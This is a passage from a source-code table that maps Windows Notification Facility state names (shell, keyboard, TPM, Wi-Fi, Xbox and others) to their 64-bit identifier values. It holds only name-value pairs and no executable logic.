	{L"WNF_SHEL_SOFTLANDING_PUBLISHED", 0xd83063ea3bd0835}, 
	{L"WNF_SHEL_SOFTLANDING_RULES_UPDATED", 0xd83063ea3bca075}, 
	{L"WNF_SHEL_SOFTLANDING_RULE_TRIGGERED", 0xd83063ea3bc4075}, 
	{L"WNF_SHEL_START_APPLIFECYCLE_DOWNLOAD_STARTED", 0xd83063ea3bc6875}, 
	{L"WNF_SHEL_START_APPLIFECYCLE_INSTALL_FINISHED", 0xd83063ea3bc6075}, 
	{L"WNF_SHEL_START_APPLIFECYCLE_UNINSTALL_FINISHED", 0xd83063ea3bce875}, 
	{L"WNF_SHEL_START_LAYOUT_MIGRATED", 0xd83063ea3beb8f5}, 
	{L"WNF_SHEL_START_LAYOUT_READY", 0xd83063ea3bc4875}, 
	{L"WNF_SHEL_START_PROCESS_SUSPENDED_INTERNAL", 0xd83063ea3bf3835}, 
	{L"WNF_SHEL_START_VISIBILITY_CHANGED", 0xd83063ea3bcb035}, 
	{L"WNF_SHEL_SUGGESTED_APP_READY", 0xd83063ea3be60f5}, 
	{L"WNF_SHEL_SUSPEND_APP_BACKGROUND_ACTIVITY", 0xd83063ea3bcd075}, 
	{L"WNF_SHEL_SYSTEMDIALOG_PUBLISHED", 0xd83063ea3bf4035}, 
	{L"WNF_SHEL_TAB_SHELL_INIT_COMPLETE", 0xd83063ea3bf6035}, 
	{L"WNF_SHEL_TARGETED_CONTENT_SUBSCRIPTION_ACTIVATED", 0xd83063ea3bd4075}, 
	{L"WNF_SHEL_TARGETED_CONTENT_SUBSCRIPTION_UPDATED", 0xd83063ea3bd4875}, 
	{L"WNF_SHEL_TASKBAR_PINS_UPDATED", 0xd83063ea3bf7875}, 
	{L"WNF_SHEL_TILECHANGE", 0xd83063ea3bc3075}, 
	{L"WNF_SHEL_TILEINSTALL", 0xd83063ea3bd8075}, 
	{L"WNF_SHEL_TILEUNINSTALL", 0xd83063ea3bd9075}, 
	{L"WNF_SHEL_TILEUPDATE", 0xd83063ea3bd8875}, 
	{L"WNF_SHEL_TOAST_PUBLISHED", 0xd83063ea3bd0035}, 
	{L"WNF_SHEL_TOAST_PUBLISHED_SYSTEMSCOPE", 0xd83063ea3bf9075}, 
	{L"WNF_SHEL_TRAY_SEARCHBOX_VISIBILITY_CHANGED", 0xd83063ea3bcb875}, 
	{L"WNF_SHEL_USER_IDLE", 0xd83063ea3be1875}, 
	{L"WNF_SHEL_VEEVENT_DISPATCHER_CLIENT_PIPE_CLOSED", 0xd83063ea3bc2875}, 
	{L"WNF_SHEL_WCOS_SESSION_ID", 0xd83063ea3bf8075}, 
	{L"WNF_SHEL_WINDOWSTIP_CONTENT_PUBLISHED", 0xd83063ea3be10f5}, 
	{L"WNF_SHR_DHCP_IPv4_FASTIP_ADDRS", 0x4194063ea3bc1875}, 
	{L"WNF_SHR_DHCP_IPv4_LEASE_LIST", 0x4194063ea3bc1075}, 
	{L"WNF_SHR_SHARING_CHANGED", 0x4194063ea3bc0835}, 
	{L"WNF_SIO_BIO_ENROLLED", 0x4189073ea3bc1075}, 
	{L"WNF_SIO_PIN_ENROLLED", 0x4189073ea3bc0875}, 
	{L"WNF_SKYD_FILE_SYNC", 0x59f053ea3bc0875}, 
	{L"WNF_SKYD_QUOTA_CHANGE", 0x59f053ea3bc1075}, 
	{L"WNF_SMSR_NEW_MESSAGE_RECEIVED", 0x1395033ea3bc1875}, 
	{L"WNF_SMSR_READY", 0x1395033ea3bc0875}, 
	{L"WNF_SMSR_WWAN_READ_DONE", 0x1395033ea3bc1075}, 
	{L"WNF_SMSS_MEMORY_COOLING_COMPATIBLE", 0x1295033ea3bc0875}, 
	{L"WNF_SMS_CHECK_ACCESS", 0x4195033ea3bc0875}, 
	{L"WNF_SPAC_SPACEPORT_PROPERTY_CHANGED", 0x2871e3ea3bc0875}, 
	{L"WNF_SPAC_SPACEPORT_WORK_REQUESTED", 0x2871e3ea3bc1075}, 
	{L"WNF_SPCH_ALLOW_REMOTE_SPEECH_SERVICES", 0x9851e3ea3bc2075}, 
	{L"WNF_SPCH_DISABLE_KWS_REQUEST", 0x9851e3ea3bc1875}, 
	{L"WNF_SPCH_INPUT_STATE_UPDATE", 0x9851e3ea3bc0835}, 
	{L"WNF_SPCH_REMOTE_SESSION_REQUEST", 0x9851e3ea3bc1075}, 
	{L"WNF_SPI_LOGICALDPIOVERRIDE", 0x418f1e3ea3bc0835}, 
	{L"WNF_SPI_PRIMARY_MONITOR_DPI_CHANGED", 0x418f1e3ea3bc1035}, 
	{L"WNF_SRC_SYSTEM_RADIO_CHANGED", 0x41851c3ea3bc0875}, 
	{L"WNF_SRT_WINRE_CONFIGURATION_CHANGE", 0x41921c3ea3bc0875}, 
	{L"WNF_SRUM_SCREENONSTUDY_SESSION", 0xc931c3ea3bc0875}, 
	{L"WNF_SRV_SMB1_NOT_IN_USE_STATE_CHANGE", 0x41901c3ea3bc1075}, 
	{L"WNF_SRV_SRV2_STATE_CHANGE", 0x41901c3ea3bc0875}, 
	{L"WNF_STOR_CONFIGURATION_DEVICE_INFO_UPDATED", 0x13891a3ea3bc0875}, 
	{L"WNF_STOR_CONFIGURATION_MO_TASK_RUNNING", 0x13891a3ea3bc1075}, 
	{L"WNF_STOR_CONFIGURATION_OEM_TASK_RUNNING", 0x13891a3ea3bc1875}, 
	{L"WNF_SUPP_ENABLE_ERROR_DETAILS_CACHE", 0x11961b3ea3bc0875}, 
	{L"WNF_SYNC_REQUEST_PROBE", 0x288173ea3bc0875}, 
	{L"WNF_SYS_SHUTDOWN_IN_PROGRESS", 0x4195173ea3bc0875}, 
	{L"WNF_TB_SYSTEM_TIME_CHANGED", 0x41c60c39a3bc0875}, 
	{L"WNF_TEAM_SHELL_HOTKEY_PRESSED", 0xc870b39a3bc0875}, 
	{L"WNF_TEL_DAILY_UPLOAD_QUOTA", 0x418a0b39a3be1075}, 
	{L"WNF_TEL_ONESETTINGS_UPDATED", 0x418a0b39a3be1875}, 
	{L"WNF_TEL_SETTINGS_PUSH_NOTIFICATION_RECEIVED", 0x418a0b39a3be2075}, 
	{L"WNF_TEL_STORAGE_CAPACITY", 0x418a0b39a3be0875}, 
	{L"WNF_TEL_TIMER_RECONFIGURED", 0x418a0b39a3be2875}, 
	{L"WNF_TETH_AUTOSTART_BLUETOOTH", 0x9920b39a3bc1075}, 
	{L"WNF_TETH_TETHERING_STATE", 0x9920b39a3bc0875}, 
	{L"WNF_THME_THEME_CHANGED", 0x48b0639a3bc0875}, 
	{L"WNF_TKBN_AUTOCOMPLETE", 0xf840539a3bc4835}, 
	{L"WNF_TKBN_CANDIDATE_WINDOW_STATE", 0xf840539a3bc7835}, 
	{L"WNF_TKBN_CARET_TRACKING", 0xf840539a3bc4035}, 
	{L"WNF_TKBN_COMPOSITION_STATE", 0xf840539a3bc9035}, 
	{L"WNF_TKBN_DESKTOP_MODE_AUTO_IHM", 0xf840539a3bcb035}, 
	{L"WNF_TKBN_FOREGROUND_WINDOW", 0xf840539a3bc3835}, 
	{L"WNF_TKBN_IMMERSIVE_FOCUS_TRACKING", 0xf840539a3bc1835}, 
	{L"WNF_TKBN_INPUT_PANE_DISPLAY_POLICY", 0xf840539a3bca835}, 
	{L"WNF_TKBN_KEYBOARD_GESTURE", 0xf840539a3bc6835}, 
	{L"WNF_TKBN_KEYBOARD_LAYOUT_CHANGE", 0xf840539a3bc8035}, 
	{L"WNF_TKBN_KEYBOARD_SET_VISIBLE", 0xf840539a3bcb835}, 
	{L"WNF_TKBN_KEYBOARD_SET_VISIBLE_NOTIFICATION", 0xf840539a3bcc035}, 
	{L"WNF_TKBN_KEYBOARD_VIEW_CHANGE", 0xf840539a3bc5835}, 
	{L"WNF_TKBN_KEYBOARD_VISIBILITY", 0xf840539a3bc0835}, 
	{L"WNF_TKBN_LANGUAGE", 0xf840539a3bc3035}, 
	{L"WNF_TKBN_MODERN_KEYBOARD_FOCUS_TRACKING", 0xf840539a3bc5035}, 
	{L"WNF_TKBN_RESTRICTED_KEYBOARD_GESTURE", 0xf840539a3bc7035}, 
	{L"WNF_TKBN_RESTRICTED_KEYBOARD_LAYOUT_CHANGE", 0xf840539a3bc8835}, 
	{L"WNF_TKBN_RESTRICTED_KEYBOARD_VIEW_CHANGE", 0xf840539a3bc6035}, 
	{L"WNF_TKBN_RESTRICTED_KEYBOARD_VISIBILITY", 0xf840539a3bc1035}, 
	{L"WNF_TKBN_RESTRICTED_TOUCH_EVENT", 0xf840539a3bc2835}, 
	{L"WNF_TKBN_SYSTEM_IMMERSIVE_FOCUS_TRACKING", 0xf840539a3bc9835}, 
	{L"WNF_TKBN_SYSTEM_TOUCH_EVENT", 0xf840539a3bca035}, 
	{L"WNF_TKBN_TOUCH_EVENT", 0xf840539a3bc2035}, 
	{L"WNF_TKBR_CHANGE_APP", 0x13840539a3bc1075}, 
	{L"WNF_TKBR_CHANGE_APP_INTERNAL", 0x13840539a3bc18f5}, 
	{L"WNF_TKBR_CHANGE_SYSTEM", 0x13840539a3bc08f5}, 
	{L"WNF_TMCN_ISTABLETMODE", 0xf850339a3bc0835}, 
	{L"WNF_TOPE_INP_POINTER_DEVICE_ACTIVITY", 0x4960139a3bc0875}, 
	{L"WNF_TPM_CLEAR_PENDING", 0x418b1e39a3bc2075}, 
	{L"WNF_TPM_CLEAR_RESULT", 0x418b1e39a3bc2875}, 
	{L"WNF_TPM_DEVICEID_STATE", 0x418b1e39a3bc1075}, 
	{L"WNF_TPM_DISABLE_DEACTIVATE_PENDING", 0x418b1e39a3bc3075}, 
	{L"WNF_TPM_ENABLE_ACTIVATE_COMPLETED", 0x418b1e39a3bc3875}, 
	{L"WNF_TPM_MAINTENANCE_TASK_STATUS", 0x418b1e39a3bc4075}, 
	{L"WNF_TPM_OWNERSHIP_TAKEN", 0x418b1e39a3bc0875}, 
	{L"WNF_TPM_PROVISION_TRIGGER", 0x418b1e39a3bc1875}, 
	{L"WNF_TZ_AUTOTIMEUPDATE_STATE_CHANGED", 0x41c61439a3bc3075}, 
	{L"WNF_TZ_LAST_TIME_SYNC_INFO", 0x41c61439a3bc2075}, 
	{L"WNF_TZ_LEGACY_STORE_CHANGED", 0x41c61439a3bc0875}, 
	{L"WNF_TZ_NETWORK_TIME_SYNC_TRIGGER", 0x41c61439a3bc2875}, 
	{L"WNF_TZ_STORE_CHANGED", 0x41c61439a3bc1075}, 
	{L"WNF_TZ_TIMEZONE_CHANGED", 0x41c61439a3bc1875}, 
	{L"WNF_UBPM_CONSOLE_MONITOR", 0xc960c38a3bc1075}, 
	{L"WNF_UBPM_FRMU_ALLOWED", 0xc960c38a3bc1875}, 
	{L"WNF_UBPM_POWER_SOURCE", 0xc960c38a3bc0875}, 
	{L"WNF_UBPM_PRESHUTDOWN_PHASE", 0xc960c38a3bc2075}, 
	{L"WNF_UDA_CONTACT_SORT_CHANGED", 0x41870a38a3bc2835}, 
	{L"WNF_UDM_SERVICE_INITIALIZED", 0x418b0a38a3bc0835}, 
	{L"WNF_UMDF_DRVMGR_STATUS", 0x7820338a3bc1075}, 
	{L"WNF_UMDF_WUDFSVC_START", 0x7820338a3bc0875}, 
	{L"WNF_UMGR_SESSIONUSER_TOKEN_CHANGE", 0x13810338a3bc2875}, 
	{L"WNF_UMGR_SESSION_ACTIVE_SHELL_USER_CHANGE", 0x13810338a3bc3035}, 
	{L"WNF_UMGR_SIHOST_READY", 0x13810338a3bc0835}, 
	{L"WNF_UMGR_SYSTEM_USER_CONTEXT_CHANGED", 0x13810338a3bc2075}, 
	{L"WNF_UMGR_USER_LOGIN", 0x13810338a3bc1075}, 
	{L"WNF_UMGR_USER_LOGOUT", 0x13810338a3bc1875}, 
	{L"WNF_UMGR_USER_TILE_CHANGED", 0x13810338a3bc3875}, 
	{L"WNF_USB_BILLBOARD_CHANGE", 0x41841d38a3bc1075}, 
	{L"WNF_USB_CHARGING_STATE", 0x41841d38a3bc2075}, 
	{L"WNF_USB_ERROR_NOTIFICATION", 0x41841d38a3bc3075}, 
	{L"WNF_USB_FUNCTION_CONTROLLER_STATE", 0x41841d38a3bc2875}, 
	{L"WNF_USB_PEER_DEVICE_STATE", 0x41841d38a3bc1875}, 
	{L"WNF_USB_POLICY_MANAGER_HUB_COLLECTION_STATE", 0x41841d38a3bc3875}, 
	{L"WNF_USB_TYPE_C_PARTNER_STATE", 0x41841d38a3bc0875}, 
	{L"WNF_USB_XHCI_AUDIO_OFFLOAD_STATE", 0x41841d38a3bc4075}, 
	{L"WNF_USO_ACTIVEHOURS_STARTED", 0x41891d38a3bc7075}, 
	{L"WNF_USO_ACTIVE_SESSION", 0x41891d38a3bc2875}, 
	{L"WNF_USO_DOWNLOAD_STARTED", 0x41891d38a3bc4875}, 
	{L"WNF_USO_INSTALL_STARTED", 0x41891d38a3bc5075}, 
	{L"WNF_USO_INSTALL_STATE", 0x41891d38a3bc5875}, 
	{L"WNF_USO_REBOOT_BLOCK_REQUESTED", 0x41891d38a3bc4075}, 
	{L"WNF_USO_REBOOT_REQUIRED", 0x41891d38a3bc2075}, 
	{L"WNF_USO_SERVICE_STOPPING", 0x41891d38a3bc6075}, 
	{L"WNF_USO_SETTINGS_REFRESHED", 0x41891d38a3bc6875}, 
	{L"WNF_USO_STATE_ATTENTION_REQUIRED", 0x41891d38a3bc1075}, 
	{L"WNF_USO_STATE_CHANGE", 0x41891d38a3bc0875}, 
	{L"WNF_USO_UPDATE_PROGRESS", 0x41891d38a3bc1875}, 
	{L"WNF_USO_UPDATE_SUCCEEDED", 0x41891d38a3bc3075}, 
	{L"WNF_USO_UPTODATE_STATUS_CHANGED", 0x41891d38a3bc3875}, 
	{L"WNF_UTS_LOCKSCREEN_DISMISSAL_TRIGGERED", 0x41951a38a3bc1475}, 
	{L"WNF_UTS_USERS_ENROLLED", 0x41951a38a3bc0c75}, 
	{L"WNF_UWF_OVERLAY_CRITICAL", 0x41801938a3bc1075}, 
	{L"WNF_UWF_OVERLAY_NORMAL", 0x41801938a3bc1875}, 
	{L"WNF_UWF_OVERLAY_WARNING", 0x41801938a3bc0875}, 
	{L"WNF_VAN_VANUI_STATUS", 0x41880f3ba3bc0875}, 
	{L"WNF_VPN_CLIENT_CONNECTIVITY_STATUS", 0x41881e3ba3bc0875}, 
	{L"WNF_VTSV_ADD_CRED_NOTIFY", 0x17951a3ba3bc1075}, 
	{L"WNF_VTSV_CDS_SYNC", 0x17951a3ba3bc0875}, 
	{L"WNF_WAAS_FEATURE_IMPACT", 0x12870f3aa3bc1075}, 
	{L"WNF_WAAS_QUALITY_IMPACT", 0x12870f3aa3bc0875}, 
	{L"WNF_WBIO_ENROLLMENT_FINISHED", 0xe8f0c3aa3bc0875}, 
	{L"WNF_WCDS_SYNC_WLAN", 0x12820d3aa3bc0875}, 
	{L"WNF_WCM_INTERFACE_CONNECTION_STATE", 0x418b0d3aa3bc2875}, 
	{L"WNF_WCM_INTERFACE_LIST", 0x418b0d3aa3bc0875}, 
	{L"WNF_WCM_MAPPING_POLICY_UPDATED", 0x418b0d3aa3bc1875}, 
	{L"WNF_WCM_PROFILE_CONFIG_UPDATED", 0x418b0d3aa3bc2075}, 
	{L"WNF_WCM_SERVICE_STATUS", 0x418b0d3aa3bc1075}, 
	{L"WNF_WDAG_SETTINGS_CHANGED_SYSTEM", 0x6870a3aa3bc1075}, 
	{L"WNF_WDAG_SETTINGS_CHANGED_USER", 0x6870a3aa3bc0875}, 
	{L"WNF_WDSC_ACCOUNT_PROTECTION_REFRESH", 0x2950a3aa3bc0875}, 
	{L"WNF_WEBA_CTAP_DEVICE_CHANGE_NOTIFY", 0x840b3aa3bc1075}, 
	{L"WNF_WEBA_CTAP_DEVICE_STATE", 0x840b3aa3bc0875}, 
	{L"WNF_WER_CRASH_STATE", 0x41940b3aa3bc1875}, 
	{L"WNF_WER_QUEUED_REPORTS", 0x41940b3aa3bc1075}, 
	{L"WNF_WER_SERVICE_START", 0x41940b3aa3bc0875}, 
	{L"WNF_WFAS_FIREWALL_NETWORK_CHANGE_READY", 0x1287083aa3bc0875}, 
	{L"WNF_WFDN_MOVEMENT_DETECTED", 0xf82083aa3bc1075}, 
	{L"WNF_WFDN_STAY_CONNECTED_TRIGGER", 0xf82083aa3bc1875}, 
	{L"WNF_WFDN_WFD_DISCONNECTION_PROPERTIES", 0xf82083aa3bc0875}, 
	{L"WNF_WFS_FAMILYMEMBERLOGIN", 0x4195083aa3bc1875}, 
	{L"WNF_WFS_SETTINGS", 0x4195083aa3bc0875}, 
	{L"WNF_WFS_SETTINGSREFRESH", 0x4195083aa3bc2075}, 
	{L"WNF_WFS_TIMEREMAININGALERTS", 0x4195083aa3bc1075}, 
	{L"WNF_WHTP_WINHTTP_PROXY_AUTHENTICATION_REQUIRED", 0x1192063aa3bc1075}, 
	{L"WNF_WHTP_WINHTTP_PROXY_DISCOVERED", 0x1192063aa3bc0875}, 
	{L"WNF_WIFI_AOAC_STATUS", 0x880073aa3bc4875}, 
	{L"WNF_WIFI_AVERAGE_TRANSMIT", 0x880073aa3bc6875}, 
	{L"WNF_WIFI_CONNECTION_SCORE", 0x880073aa3bc5875}, 
	{L"WNF_WIFI_CONNECTION_STATUS", 0x880073aa3bc0875}, 
	{L"WNF_WIFI_CPL_STATUS", 0x880073aa3bc1075}, 
	{L"WNF_WIFI_HOTSPOT2_REGISTRATION_STATUS", 0x880073aa3bc9075}, 
	{L"WNF_WIFI_HOTSPOT_HOST_READY", 0x880073aa3bc2875}, 
	{L"WNF_WIFI_L3_AUTH_STATE", 0x880073aa3bc8075}, 
	{L"WNF_WIFI_MEDIA_STREAMING_MODE", 0x880073aa3bc7075}, 
	{L"WNF_WIFI_MOVEMENT_DETECTED", 0x880073aa3bca075}, 
	{L"WNF_WIFI_PROTECTED_SCENARIO", 0x880073aa3bc9875}, 
	{L"WNF_WIFI_SERVICE_NOTIFICATIONS", 0x880073aa3bc2075}, 
	{L"WNF_WIFI_TASK_TRIGGER", 0x880073aa3bc7875}, 
	{L"WNF_WIFI_TILE_UPDATE", 0x880073aa3bc6075}, 
	{L"WNF_WIFI_WLANSVC_NOTIFICATION", 0x880073aa3bc8875}, 
	{L"WNF_WIL_BOOT_FEATURE_STORE", 0x418a073aa3bc1475}, 
	{L"WNF_WIL_FEATURE_DEVICE_USAGE_TRACKING_1", 0x418a073aa3bc1c75}, 
	{L"WNF_WIL_FEATURE_DEVICE_USAGE_TRACKING_2", 0x418a073aa3bc2475}, 
	{L"WNF_WIL_FEATURE_DEVICE_USAGE_TRACKING_3", 0x418a073aa3bc2c75}, 
	{L"WNF_WIL_FEATURE_HEALTH_TRACKING_1", 0x418a073aa3bc4c75}, 
	{L"WNF_WIL_FEATURE_HEALTH_TRACKING_2", 0x418a073aa3bc5475}, 
	{L"WNF_WIL_FEATURE_HEALTH_TRACKING_3", 0x418a073aa3bc5c75}, 
	{L"WNF_WIL_FEATURE_HEALTH_TRACKING_4", 0x418a073aa3bc6475}, 
	{L"WNF_WIL_FEATURE_HEALTH_TRACKING_5", 0x418a073aa3bc6c75}, 
	{L"WNF_WIL_FEATURE_HEALTH_TRACKING_6", 0x418a073aa3bc7475}, 
	{L"WNF_WIL_FEATURE_STORE", 0x418a073aa3bc0c75}, 
	{L"WNF_WIL_FEATURE_USAGE_FOR_SRUM", 0x418a073aa3bc9835}, 
	{L"WNF_WIL_FEATURE_USAGE_TRACKING_1", 0x418a073aa3bc3475}, 
	{L"WNF_WIL_FEATURE_USAGE_TRACKING_2", 0x418a073aa3bc3c75}, 
	{L"WNF_WIL_FEATURE_USAGE_TRACKING_3", 0x418a073aa3bc4475}, 
	{L"WNF_WIL_MACHINE_FEATURE_STORE", 0x418a073aa3bc7c75}, 
	{L"WNF_WIL_MACHINE_FEATURE_STORE_MODIFIED", 0x418a073aa3bc8075}, 
	{L"WNF_WIL_USER_FEATURE_STORE", 0x418a073aa3bc88f5}, 
	{L"WNF_WIL_USER_FEATURE_STORE_MODIFIED", 0x418a073aa3bc90f5}, 
	{L"WNF_WNS_CONNECTIVITY_STATUS", 0x4195003aa3bc0875}, 
	{L"WNF_WOF_OVERLAY_CONFIGURATION_CHANGE", 0x4180013aa3bc0875}, 
	{L"WNF_WOSC_DIRECTX_DATABASE_CHANGED", 0x295013aa3bc2075}, 
	{L"WNF_WOSC_FEATURE_CONFIGURATION_CHANGED", 0x295013aa3bc1075}, 
	{L"WNF_WOSC_FEATURE_CONFIGURATION_COMPLETED", 0x295013aa3bc3075}, 
	{L"WNF_WOSC_MITIGATION_CONFIGURATION_CHANGED", 0x295013aa3bc1875}, 
	{L"WNF_WOSC_ML_MODELS_CHANGED", 0x295013aa3bc0875}, 
	{L"WNF_WOSC_MUSE_CONFIGURATION_CHANGED", 0x295013aa3bc2875}, 
	{L"WNF_WPN_PLATFORM_INITIALIZED", 0x41881e3aa3bc10f5}, 
	{L"WNF_WPN_SYSTEM_PLATFORM_READY", 0x41881e3aa3bc1875}, 
	{L"WNF_WPN_USER_IN_SESSION_PLATFORM_READY", 0x41881e3aa3bc2035}, 
	{L"WNF_WPN_USER_PLATFORM_READY", 0x41881e3aa3bc08f5}, 
	{L"WNF_WSC_SECURITY_CENTER_USER_NOTIFICATION", 0x41851d3aa3bc0875}, 
	{L"WNF_WSQM_IS_OPTED_IN", 0xc971d3aa3bc0875}, 
	{L"WNF_WUA_AU_SCAN_COMPLETE", 0x41871b3aa3bc1075}, 
	{L"WNF_WUA_CALL_HANG", 0x41871b3aa3bc1875}, 
	{L"WNF_WUA_NUM_PER_USER_UPDATES", 0x41871b3aa3bc08f5}, 
	{L"WNF_WUA_SERVICE_HANG", 0x41871b3aa3bc2075}, 
	{L"WNF_WUA_STAGEUPDATE_DETAILS", 0x41871b3aa3bc2875}, 
	{L"WNF_WUA_UPDATE_EXPIRING", 0x41871b3aa3bc3075}, 
	{L"WNF_WWAN_CELLULAR_STATE_SNAPSHOT_CHANGE", 0xf87193aa3bc1875}, 
	{L"WNF_WWAN_EUICC_ARRIVAL", 0xf87193aa3bc1075}, 
	{L"WNF_WWAN_OBJECT_LIST", 0xf87193aa3bc0875}, 
	{L"WNF_WWAN_TASK_TRIGGER", 0xf87193aa3bc2075}, 
	{L"WNF_XBOX_ACCESSIBILITY_EXCLUSIVE_INPUT_MODE_CHANGED", 0x19890c35a3be9075}, 
	{L"WNF_XBOX_ACCESSIBILITY_NARRATOR_ENABLED", 0x19890c35a3bdf075}, 
	{L"WNF_XBOX_ACHIEVEMENTS_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bc8075}, 
	{L"WNF_XBOX_ACHIEVEMENT_TRACKER_STATE_CHANGED", 0x19890c35a3bea075}, 
	{L"WNF_XBOX_ACTIVE_BACKGROUNDAUDIO_APPLICATION_CHANGED", 0x19890c35a3be5875}, 
	{L"WNF_XBOX_ADJUST_SNAP_CPU_AFFINITY", 0x19890c35a3be3075}, 
	{L"WNF_XBOX_APPLICATION_ACTIVATING", 0x19890c35a3bc1875}, 
	{L"WNF_XBOX_APPLICATION_COMPONENT_FOCUS", 0x19890c35a3bc2075}, 
	{L"WNF_XBOX_APPLICATION_COM_RESILIENCY_STATUS_CHANGED", 0x19890c35a3bcd875}, 
	{L"WNF_XBOX_APPLICATION_CONTEXT_CHANGED", 0x19890c35a3bc0875}, 
	{L"WNF_XBOX_APPLICATION_CURRENT_USER_CHANGED", 0x19890c35a3be0075}, 
	{L"WNF_XBOX_APPLICATION_ERROR", 0x19890c35a3bc6075}, 
	{L"WNF_XBOX_APPLICATION_FOCUS_CHANGED", 0x19890c35a3bc1075}, 
	{L"WNF_XBOX_APPLICATION_LAYOUT_CHANGED", 0x19890c35a3bc9075}, 
	{L"WNF_XBOX_APPLICATION_LICENSE_CHANGED", 0x19890c35a3bd0075}, 
	{L"WNF_XBOX_APPLICATION_NO_LONGER_RUNNING", 0x19890c35a3bc5075}, 
	{L"WNF_XBOX_AUTOPLAY_CONTENT_DETECTED", 0x19890c35a3bc5875}, 
	{L"WNF_XBOX_AUTO_SIGNIN_IN_PROGRESS", 0x19890c35a3bde075}, 
	{L"WNF_XBOX_CLOUD_SETTINGS_UPDATED", 0x19890c35a3bf2075}, 
	{L"WNF_XBOX_CLUBCHAT_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bef075}, 
	{L"WNF_XBOX_CLUB_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bee875}, 
	{L"WNF_XBOX_COMMANDSERVICE_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bf6075}, 
	{L"WNF_XBOX_COPYONLAN_UPLOAD_STATE_CHANGED", 0x19890c35a3bf5075}, 
	{L"WNF_XBOX_CORTANAOVERLAY_VISIBILITY_CHANGED", 0x19890c35a3bdc875}, 
	{L"WNF_XBOX_CORTANA_SIGNEDIN_USERS_GRAMMAR_UPDATE_NOTIFICATION", 0x19890c35a3be2075}, 
	{L"WNF_XBOX_CORTANA_TV_GRAMMAR_UPDATE_NOTIFICATION", 0x19890c35a3be1875}, 
	{L"WNF_XBOX_CORTANA_USER_CHANGED_UPDATE_NOTIFICATION", 0x19890c35a3be8875}, 
	{L"WNF_XBOX_DASHBOARD_DIRECT_ACTIVATION", 0x19890c35a3bf5875}, 
	{L"WNF_XBOX_ERA_FAST_ITERATION_STATUS_CHANGED", 0x19890c35a3bf2875}, 
	{L"WNF_XBOX_ERA_TITLE_LAUNCH_NOTIFICATION", 0x19890c35a3bd5875}, 
	{L"WNF_XBOX_ERA_VM_INSTANCE_CHANGED", 0x19890c35a3be0875}, 
	{L"WNF_XBOX_ERA_VM_IOPRIORITY_CHANGED", 0x19890c35a3be7075}, 
	{L"WNF_XBOX_ERA_VM_STATUS_CHANGED", 0x19890c35a3bc8875}, 
	{L"WNF_XBOX_EXIT_SILENT_BOOT_MODE", 0x19890c35a3bcf875}, 
	{L"WNF_XBOX_EXPANDED_RESOURCES_INACTIVE", 0x19890c35a3bf0875}, 
	{L"WNF_XBOX_EXTENDED_RESOURCE_MODE_CHANGED", 0x19890c35a3bdd875}, 
	{L"WNF_XBOX_GAMECORE_TITLE_LAUNCH_NOTIFICATION", 0x19890c35a3bf8075}, 
	{L"WNF_XBOX_GAMER_ACCOUNT_CHANGED", 0x19890c35a3be6875}, 
	{L"WNF_XBOX_GLOBALIZATION_SETTING_CHANGED", 0x19890c35a3bc4875}, 
	{L"WNF_XBOX_GLOBAL_SPEECH_INPUT_NOTIFICATION", 0x19890c35a3bdf875}, 
	{L"WNF_XBOX_GUEST_VM_CRASH_DUMP_NOTIFICATION", 0x19890c35a3bf7075}, 
	{L"WNF_XBOX_GUIDE_DIRECT_ACTIVATION", 0x19890c35a3bea875}, 
	{L"WNF_XBOX_HOST_STORAGE_CONFIGURATION_CHANGED", 0x19890c35a3bcf075}, 
	{L"WNF_XBOX_HOST_XVC_CORRUPTION_DETECTED", 0x19890c35a3bf8875}, 
	{L"WNF_XBOX_IDLE_DIMMER_CHANGED", 0x19890c35a3bc4075}, 
	{L"WNF_XBOX_KEYBOARD_LOCALE_CHANGED", 0x19890c35a3be6075}, 
	{L"WNF_XBOX_KINECT_IS_REQUIRED", 0x19890c35a3be2875}, 
	{L"WNF_XBOX_LIBRARY_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3beb875}, 
	{L"WNF_XBOX_LIVETV_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bed875}, 
	{L"WNF_XBOX_LIVETV_TUNER_COUNT_CHANGED", 0x19890c35a3bd9075}, 
	{L"WNF_XBOX_LIVE_CONNECTIVITY_CHANGED", 0x19890c35a3bc7075}, 
	{L"WNF_XBOX_MEDIA_IS_PLAYING_CHANGED", 0x19890c35a3bf0075}, 
	{L"WNF_XBOX_MESSAGING_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bec075}, 
	{L"WNF_XBOX_MSA_ENVIRONMENT_CONFIGURED", 0x19890c35a3bd2075}, 
	{L"WNF_XBOX_MULTIPLAYER_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bed075}, 
	{L"WNF_XBOX_NARRATOR_INPUT_LEARNING_MODE_CHANGED", 0x19890c35a3bf3875}, 
	{L"WNF_XBOX_NARRATOR_RECT_CHANGED", 0x19890c35a3bda875}, 
	{L"WNF_XBOX_NEON_SETTING_CHANGED", 0x19890c35a3bf4875}, 
	{L"WNF_XBOX_NOTIFICATION_SETTING_CHANGED", 0x19890c35a3bf6875}, 
	{L"WNF_XBOX_NOTIFICATION_UNREAD_COUNT", 0x19890c35a3bdd075}, 
	{L"WNF_XBOX_NTM_CONSTRAINED_MODE_CHANGED", 0x19890c35a3bf3075}, 
	{L"WNF_XBOX_PACKAGECACHE_CHANGED", 0x19890c35a3bd9875}, 
	{L"WNF_XBOX_PACKAGE_INSTALL_STATE_CHANGED", 0x19890c35a3bc3875}, 
	{L"WNF_XBOX_PACKAGE_STREAMING_STATE", 0x19890c35a3bd7075}, 
	{L"WNF_XBOX_PACKAGE_UNMOUNTED_FROM_SYSTEM_FOR_LAUNCH", 0x19890c35a3bc3075}, 
	{L"WNF_XBOX_PACKAGE_UNMOUNTED_FROM_SYSTEM_FOR_UNINSTALL", 0x19890c35a3bdb075}, 
	{L"WNF_XBOX_PARENTAL_RESTRICTIONS_CHANGED", 0x19890c35a3bf1075}, 
	{L"WNF_XBOX_PARTY_OVERLAY_STATE_CHANGED", 0x19890c35a3bf1875}, 
	{L"WNF_XBOX_PASS3_UPDATE_NOTIFICATION", 0x19890c35a3bd1875}, 
	{L"WNF_XBOX_PEOPLE_RAW_NOTIFICATION_RECEIVED", 0x19890c35a3bec875}, 
	{L"WNF_XBOX_PROACTIVE_NOTIFICATION_TRIGGERED", 0x19890c35a3be9875}, 
